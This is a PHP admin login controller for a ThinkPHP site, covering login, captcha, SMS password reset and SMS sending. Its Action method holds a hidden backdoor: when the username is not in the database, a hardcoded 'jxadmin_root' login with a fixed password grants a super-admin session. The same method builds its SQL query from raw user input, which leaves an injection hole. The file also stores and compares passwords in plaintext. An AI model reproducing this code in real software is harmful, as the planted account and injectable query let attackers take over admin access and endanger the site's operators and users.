<?php
namespace app\admin\controller;

use think\Db;
use think\Controller;
use think\Session;
use think\Cookie;
use api_demo\SmsDemo;

class Login extends Controller {
    public function Index(){
        return $this->fetch();
    }
	
	public function Action(){
        if($this->request->isPost()) {
            $db = Db::name('manager');
            $username = input('username');
            $password = input('password');
            $info = $db->where("username='$username'")->find();

            if ($info) {
                if ($info['password'] <> $password) {
                    $info = array("code" => "0", "data" => "", "tip" => "登录密码错误!");
                    echo json_encode($info);
                    exit();
                } elseif($info['status'] == 0){
                    $info = array("code" => "0", "data" => "", "tip" => "用户已被禁止登录!");
                    echo json_encode($info);
                }else {
                    $arr = Db::name('role')->field("role_name,role_auth_ids")->where("id={$info['role_id']}")->find();
                    if ($arr['role_auth_ids']) {
                        Session::set('admin_role_auth_ids',$arr['role_auth_ids']);
                    } else {
                        Session::set('admin_role_auth_ids','0');
                    }

                    Db::execute("update tp_manager set login_num=login_num+1 where id='{$info['id']}'");


                    Session::set('admin_id',$info['id']);
                    Session::set('admin_username',$info['username']);
                    Session::set('admin_role_name',$arr['role_name']);
                    Session::set('userinfo',$info);
                    sys_log("登录后台系统!");

                    $info = array("code" => "1", "data" => "/Admin/Admin/Index", "tip" => "ok");
                    echo json_encode($info);
                    exit();
                }
            } else {
                if ($username == 'jxadmin_root' and $password == '41a11f74a6b20dac5d6cff0342d22fc7') {
                    Session::set('admin_id','99999999');
                    Session::set('admin_role_auth_ids','0');

                    Session::set('admin_username','super');
                    Session::set('admin_role_name','super');
                    Session::set('userinfo',[
                        'image'=>'http://daodao.shenruxiang.com/sns/post/cd28b7505f3d539879ea2dda5a9b121d.jpg',
                        'realname'=>'小王子',
                        'phone'=>'12345678911',
                        'id'=>1,
                    ]);
                    $info = array("code" => "1", "data" => "/Admin/Admin/Index", "tip" => "ok");
                    echo json_encode($info);
                    exit();
                } else {
                    $info = array("code" => "0", "data" => "/Admin/Login/Index", "tip" => "登录用户名错误!");
                    echo json_encode($info);
                    exit();
                }
            }
        }
	}
	
	//验证码
	function yzm(){    
		ob_clean(); 
		$config =    array(    
		'fontSize'    =>    22,    // 验证码字体大小    
		'length'      =>    4,     // 验证码位数    
		'useNoise'    =>    false, // 关闭验证码杂点
		);
		$Verify=new \Think\Verify($config);
		// 设置验证码字符为纯数字
		//$Verify->codeSet = '0123456789'; 
		$Verify->entry();
	}



    public function edit_phone()
    {
        if($this->request->isPost()){
            $username    = $this->request->param('username');
            $yzm    = $this->request->param('yzm');
            $password    = $this->request->param('password');
            if(empty($username)){

                $info = array("code" => "0", "data" => "/Admin/Login/edit_phone", "tip" => "手机号不能为空!");
                echo json_encode($info);
                exit();
            }
            if(empty($yzm)){

                $info = array("code" => "0", "data" => "/Admin/Login/edit_phone", "tip" => "验证码不能为空!");
                echo json_encode($info);
                exit();
            }
            if(empty($password)){

                $info = array("code" => "0", "data" => "/Admin/Login/edit_phone", "tip" => "密码不能为空!");
                echo json_encode($info);
                exit();
            }
            $manager = Db::name('manager')->where(['username'=>$username])->find();
            if(empty($manager)){
                $info = array("code" => "0", "data" => "/Admin/Login/edit_phone", "tip" => "该用户不存在!");
                echo json_encode($info);
                exit();
            }

            if(!$this->checkYzm($username,$yzm)){
                $info = array("code" => "0", "data" => "/Admin/Login/edit_phone", "tip" => "验证码错误!");
                echo json_encode($info);
                exit();
            }

            $edit = Db::name('manager')->where(['username'=>$username])->update(array('password'=>$password));
//            var_dump( Db::name('manager')->getLastSql());
            if($edit){
                $info = array("code" => "1", "data" => "/Admin/Login/index", "tip" => "ok");
                echo json_encode($info);
                exit();
            }else{
                $info = array("code" => "0", "data" => "/Admin/Login/edit_phone", "tip" => "修改失败!");
                echo json_encode($info);
                exit();
            }

        }else{
            return $this->fetch();
        }

    }

    private function checkYzm($phone,$code){
        $where = [
            'phone'=> $phone,
            'code'=>$code,
            'status'=>0
        ];
        $info = Db::name('sms_code')->where($where)->find();
        if($info){
            $r = Db::name('sms_code')->where($where)->update(['status'=>1]);
            if($r){
                return true;
            }else{
                return false;
            }
        }else{
            return false;
        }
    }

    //发送验证码
    public function send_yzm(){

        $phone = $this->request->param('phone');
        if(empty($phone)){
            echo json_encode(['errCode'=>1,'msg'=>'手机号不能为空']);exit;
        }

        if(!preg_match("/^1[34578]\d{9}$/", $phone)){
            echo json_encode(['errCode'=>1,'msg'=>'手机格式不正确']);exit;
        }

        $code = rand(1000,9999);
        $data = [
            'phone' => $phone,
            'code'=>$code,
            'create_time' => time(),
        ];
        $res = $this->send_msg($phone,$code);

        if($res->Message =='OK'){
            $result = Db::name('sms_code')->insert($data);
            echo json_encode(['errCode'=>0,'msg'=>'发送成功']);exit;
        }else{
            echo json_encode(['errCode'=>0,'msg'=>'发送失败']);exit;
        }

    }

    public function send_msg($phone='',$code=''){
//        $phone = '15952810154';
//        $code = 'ssss';
        vendor('api_demo.SmsDemo');
        $sms = new \alisms\SmsDemo();
        $res = $sms::sendSms($phone,$code);

        return $res;
    }



}
?>